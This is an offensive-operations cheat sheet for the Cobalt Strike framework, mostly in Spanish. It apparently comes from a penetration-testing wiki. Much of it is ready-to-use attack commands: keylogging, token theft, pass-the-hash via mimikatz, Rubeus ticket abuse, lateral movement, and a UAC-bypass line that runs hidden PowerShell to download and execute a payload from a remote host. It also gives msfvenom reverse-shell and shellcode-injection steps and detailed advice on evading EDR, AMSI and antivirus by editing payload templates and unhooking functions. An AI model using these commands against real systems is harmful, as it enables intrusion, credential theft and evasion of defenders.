# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.

### Peer2Peer Listeners

Los beacons de estos listeners no necesitan comunicarse directamente con el C2, pueden comunicarse a través de otros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` luego necesitas seleccionar los beacons TCP o SMB

* El **beacon TCP establecerá un listener en el puerto seleccionado**. Para conectarte a un beacon TCP usa el comando `connect <ip> <port>` desde otro beacon.
* El **beacon smb escuchará en un pipename con el nombre seleccionado**. Para conectarte a un beacon SMB necesitas usar el comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** para archivos HTA
* **`MS Office Macro`** para un documento de office con una macro
* **`Windows Executable`** para un .exe, .dll o servicio .exe
* **`Windows Executable (S)`** para un **stageless** .exe, .dll o servicio .exe (mejor stageless que staged, menos IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/executable para descargar el beacon de cobalt strike en formatos como: bitsadmin, exe, powershell y python.

#### Host Payloads

Si ya tienes el archivo que deseas alojar en un servidor web, solo ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo para alojar y la configuración del servidor web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Ejecutar binario .NET local
execute-assembly </path/to/executable.exe>
# Ten en cuenta que para cargar ensamblados más grandes de 1MB, la propiedad 'tasks_max_size' del perfil maleable necesita ser modificada.

# Capturas de pantalla
printscreen    # Tomar una sola captura de pantalla mediante el método PrintScr
screenshot     # Tomar una sola captura de pantalla
screenwatch    # Tomar capturas de pantalla periódicas del escritorio
## Ve a Ver -> Capturas de pantalla para verlas

# keylogger
keylogger [pid] [x86|x64]
## Ver > Teclas presionadas para ver las teclas presionadas

# escaneo de puertos
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inyectar acción de escaneo de puertos dentro de otro proceso
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importar módulo de Powershell
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <solo escribe el cmd de powershell aquí> # Esto usa la versión de powershell más alta soportada (no oppsec)
powerpick <cmdlet> <args> # Esto crea un proceso sacrificial especificado por spawnto, e inyecta UnmanagedPowerShell en él para mejor opsec (sin registro)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Esto inyecta UnmanagedPowerShell en el proceso especificado para ejecutar el cmdlet de PowerShell.

# Suplantación de usuario
## Generación de token con credenciales
make_token [DOMAIN\user] [password] #Crear token para suplantar a un usuario en la red
ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
rev2self # Dejar de usar el token generado con make_token
## El uso de make_token genera el evento 4624: Una cuenta ha iniciado sesión correctamente. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando por el Tipo de Inicio de Sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.

# Bypass de UAC
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Robar token de pid
## Como make_token pero robando el token de un proceso
steal_token [pid] # Además, esto es útil para acciones de red, no acciones locales
## De la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Por eso la salida del Beacon dice Suplantado <current_username> - está suplantando nuestro propio token clonado.
ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
rev2self # Dejar de usar el token de steal_token

## Lanzar proceso con nuevas credenciales
spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta ha iniciado sesión correctamente pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).

## Inyectar en proceso
inject [pid] [x64|x86] [listener]
## Desde un punto de vista de OpSec: No realices inyección entre plataformas a menos que realmente sea necesario (por ejemplo, x86 -> x64 o x64 -> x86).

## Pasar el hash
## Este proceso de modificación requiere parches en la memoria de LSASS, lo cual es una acción de alto riesgo, requiere privilegios de administrador local y no es muy viable si el Proceso Protegido Ligero (PPL) está habilitado.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pasar el hash a través de mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá el shell (si estás ejecutando como SYSTEM, estás bien).
steal_token <pid> #Robar token del proceso creado por mimikatz

## Pasar el ticket
## Solicitar un ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Crear una nueva sesión de inicio de sesión para usar con el nuevo ticket (para no sobrescribir el comprometido)
make_token <domain>\<username> DummyPass
## Escribir el ticket en la máquina del atacante desde una sesión de powershell y cargarlo
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pasar el ticket desde SYSTEM
## Generar un nuevo proceso con el ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Robar el token de ese proceso
steal_token <pid>

## Extraer ticket + Pasar el ticket
### Listar tickets
execute-assembly C:\path\Rubeus.exe triage
### Volcar ticket interesante por luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Crear nueva sesión de inicio de sesión, anotar luid y processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insertar ticket en la sesión de inicio de sesión generada
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finalmente, robar el token de ese nuevo proceso
steal_token <pid>

# Movimiento Lateral
## Si se creó un token, se utilizará
jump [method] [target] [listener]
## Métodos:
## psexec                    x86   Usar un servicio para ejecutar un artefacto Service EXE
## psexec64                  x64   Usar un servicio para ejecutar un artefacto Service EXE
## psexec_psh                x86   Usar un servicio para ejecutar una línea de PowerShell
## winrm                     x86   Ejecutar un script de PowerShell a través de WinRM
## winrm64                   x64   Ejecutar un script de PowerShell a través de WinRM
## wmi_msbuild               x64   movimiento lateral wmi con tarea inline c# de msbuild (oppsec)

remote-exec [method] [target] [command] # remote-exec no devuelve salida
## Métodos:
## psexec                          Ejecución remota a través del Administrador de Control de Servicios
## winrm                           Ejecución remota a través de WinRM (PowerShell)
## wmi                             Ejecución remota a través de WMI

## Para ejecutar un beacon con wmi (no está en el comando jump) solo sube el beacon y ejecútalo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Pasar sesión a Metasploit - A través de listener
## En el host de metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## En cobalt: Listeners > Agregar y establecer el Payload en HTTP Extranjero. Establecer el Host en 10.10.5.120, el Puerto en 8080 y hacer clic en Guardar.
beacon> spawn metasploit
## Solo puedes generar sesiones Meterpreter x86 con el listener extranjero.

# Pasar sesión a Metasploit - A través de inyección de shellcode
## En el host de metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Ejecutar msfvenom y preparar el listener multi/handler

## Copiar el archivo bin a la máquina host de cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un proceso x64

# Pasar sesión de metasploit a cobalt strike
## Generar shellcode Beacon stageless, ir a Attacks > Packages > Windows Executable (S), seleccionar el listener deseado, seleccionar Raw como el tipo de salida y seleccionar Usar carga útil x64.
## Usar post/windows/manage/shellcode_inject en metasploit para inyectar el shellcode generado de cobalt strike.

# Pivoting
## Abrir un proxy socks en el teamserver
beacon> socks 1080

# Conexión SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

El **`execute-assembly`** utiliza un **proceso sacrificial** mediante inyección de proceso remoto para ejecutar el programa indicado. Esto es muy ruidoso ya que para inyectar dentro de un proceso se utilizan ciertas APIs de Win que todos los EDR están verificando. Sin embargo, hay algunas herramientas personalizadas que se pueden usar para cargar algo en el mismo proceso:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- En Cobalt Strike también puedes usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

El script de agresor `https://github.com/outflanknl/HelpColor` creará el comando `helpx` en Cobalt Strike que pondrá colores en los comandos indicando si son BOFs (verde), si son Frok&Run (amarillo) y similar, o si son ProcessExecution, inyección o similar (rojo). Lo que ayuda a saber qué comandos son más sigilosos.

### Actuar como el usuario

Podrías verificar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Seguridad EID 4624 - Ver todos los inicios de sesión interactivos para conocer las horas de operación habituales.
- Sistema EID 12,13 - Ver la frecuencia de apagado/inicio/sueño.
- Seguridad EID 4624/4625 - Ver intentos NTLM válidos/inválidos entrantes.
- Seguridad EID 4648 - Este evento se crea cuando se utilizan credenciales en texto plano para iniciar sesión. Si un proceso lo generó, el binario potencialmente tiene las credenciales en texto claro en un archivo de configuración o dentro del código.

Al usar `jump` desde cobalt strike, es mejor usar el método `wmi_msbuild` para que el nuevo proceso parezca más legítimo.

### Usar cuentas de computadora

Es común que los defensores estén verificando comportamientos extraños generados por usuarios y **excluyan cuentas de servicio y cuentas de computadora como `*$` de su monitoreo**. Podrías usar estas cuentas para realizar movimiento lateral o escalada de privilegios.

### Usar cargas útiles stageless

Las cargas útiles stageless son menos ruidosas que las staged porque no necesitan descargar una segunda etapa del servidor C2. Esto significa que no generan tráfico de red después de la conexión inicial, lo que las hace menos propensas a ser detectadas por defensas basadas en la red.

### Tokens & Almacenamiento de Tokens

Ten cuidado al robar o generar tokens porque podría ser posible que un EDR enumere todos los tokens de todos los hilos y encuentre un **token perteneciente a un usuario diferente** o incluso a SYSTEM en el proceso.

Esto permite almacenar tokens **por beacon** para que no sea necesario robar el mismo token una y otra vez. Esto es útil para movimiento lateral o cuando necesitas usar un token robado múltiples veces:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Al moverse lateralmente, generalmente es mejor **robar un token que generar uno nuevo** o realizar un ataque de pasar el hash.

### Guardrails

Cobalt Strike tiene una función llamada **Guardrails** que ayuda a prevenir el uso de ciertos comandos o acciones que podrían ser detectadas por los defensores. Los guardrails se pueden configurar para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, y otros que se utilizan comúnmente para movimiento lateral o escalada de privilegios.

Además, el repositorio [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) también contiene algunas verificaciones e ideas que podrías considerar antes de ejecutar una carga útil.

### Cifrado de tickets

En un AD, ten cuidado con el cifrado de los tickets. Por defecto, algunas herramientas usarán cifrado RC4 para tickets de Kerberos, que es menos seguro que el cifrado AES y por defecto los entornos actualizados usarán AES. Esto puede ser detectado por defensores que están monitoreando algoritmos de cifrado débiles.

### Evitar Defaults

Al usar Cobalt Strike, por defecto los pipes SMB tendrán el nombre `msagent_####` y `"status_####`. Cambia esos nombres. Es posible verificar los nombres de los pipes existentes desde Cobalt Strike con el comando: `ls \\.\pipe\`

Además, con sesiones SSH se crea un pipe llamado `\\.\pipe\postex_ssh_####`. Cámbialo con `set ssh_pipename "<new_name>";`.

También en el ataque de post explotación, los pipes `\\.\pipe\postex_####` se pueden modificar con `set pipename "<new_name>"`.

En los perfiles de Cobalt Strike también puedes modificar cosas como:

- Evitar usar `rwx`
- Cómo funciona el comportamiento de inyección de procesos (qué APIs se utilizarán) en el bloque `process-inject {...}`
- Cómo funciona el "fork and run" en el bloque `post-ex {…}`
- El tiempo de espera
- El tamaño máximo de los binarios que se cargarán en memoria
- La huella de memoria y el contenido DLL con el bloque `stage {...}`
- El tráfico de red

### Bypass de escaneo de memoria

Algunos EDRs escanean la memoria en busca de algunas firmas de malware conocidas. Cobalt Strike permite modificar la función `sleep_mask` como un BOF que podrá cifrar en memoria el backdoor.

### Inyecciones de proc ruidosas

Al inyectar código en un proceso, esto suele ser muy ruidoso, esto se debe a que **ningún proceso regular suele realizar esta acción y porque las formas de hacerlo son muy limitadas**. Por lo tanto, podría ser detectado por sistemas de detección basados en comportamiento. Además, también podría ser detectado por EDRs que escanean la red en busca de **hilos que contengan código que no esté en disco** (aunque procesos como navegadores que utilizan JIT tienen esto comúnmente). Ejemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Relaciones PID y PPID

Al generar un nuevo proceso, es importante **mantener una relación padre-hijo regular** entre los procesos para evitar la detección. Si svchost.exec está ejecutando iexplorer.exe, parecerá sospechoso, ya que svchost.exe no es un padre de iexplorer.exe en un entorno normal de Windows.

Cuando se genera un nuevo beacon en Cobalt Strike, por defecto se crea un proceso utilizando **`rundll32.exe`** para ejecutar el nuevo listener. Esto no es muy sigiloso y puede ser fácilmente detectado por EDRs. Además, `rundll32.exe` se ejecuta sin argumentos, lo que lo hace aún más sospechoso.

Con el siguiente comando de Cobalt Strike, puedes especificar un proceso diferente para generar el nuevo beacon, haciéndolo menos detectable:
```bash
spawnto x86 svchost.exe
```
Puedes también cambiar esta configuración **`spawnto_x86` y `spawnto_x64`** en un perfil.

### Proxying attackers traffic

A veces, los atacantes necesitarán poder ejecutar herramientas localmente, incluso en máquinas Linux, y hacer que el tráfico de las víctimas llegue a la herramienta (por ejemplo, NTLM relay).

Además, a veces, para realizar un ataque de pass-the-hash o pass-the-ticket, es más sigiloso para el atacante **agregar este hash o ticket en su propio proceso LSASS** localmente y luego pivotar desde él en lugar de modificar un proceso LSASS de una máquina víctima.

Sin embargo, debes tener **cuidado con el tráfico generado**, ya que podrías estar enviando tráfico poco común (¿kerberos?) desde tu proceso de puerta trasera. Para esto, podrías pivotar a un proceso de navegador (aunque podrías ser atrapado inyectándote en un proceso, así que piensa en una forma sigilosa de hacerlo).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Cambiar contraseña  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Cambiar powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Cambiar $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
